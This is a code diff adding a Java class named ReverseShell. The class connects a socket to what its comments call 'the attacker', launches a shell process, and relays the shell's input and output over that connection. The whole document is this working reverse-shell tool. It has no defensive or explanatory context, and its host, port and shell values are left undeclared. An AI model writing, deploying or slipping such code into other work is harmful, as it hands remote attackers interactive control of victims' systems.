@@ -1,0 +1,41 @@
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.Socket;
+
+public class ReverseShell {
+    public static void main(String[] args) throws Exception {
+        // Open a new sock and connect to the attacker
+        Socket sock = new Socket(host, port);
+
+        // Start a shell process and merge stdout and stderr
+        Process proc = new ProcessBuilder(shell).redirectErrorStream(true).start();
+
+        // Input and output streams
+        InputStream pi = proc.getInputStream();      // stdout and stderr of the shell
+        OutputStream po = proc.getOutputStream();    // stdin of the shell
+        InputStream si = sock.getInputStream();       // stdout of the socket
+        OutputStream so = sock.getOutputStream();     // stdin of the socket
+
+        while (!sock.isClosed()) {
+            // Read output from shell (if there is any) and write to socket input
+            while (pi.available() > 0) {
+                so.write(pi.read());
+            }
+
+            // Read output from socket (if there is any) and write to shell input
+            while (si.available() > 0) {
+                po.write(si.read());
+            }
+
+            // Flush data to ensure it's sent and received immediately
+            so.flush();
+            po.flush();
+
+            // Optional: short sleep to reduce CPU usage
+            Thread.sleep(100);
+        }
+
+        proc.destroy();
+        sock.close();
+    }
+}
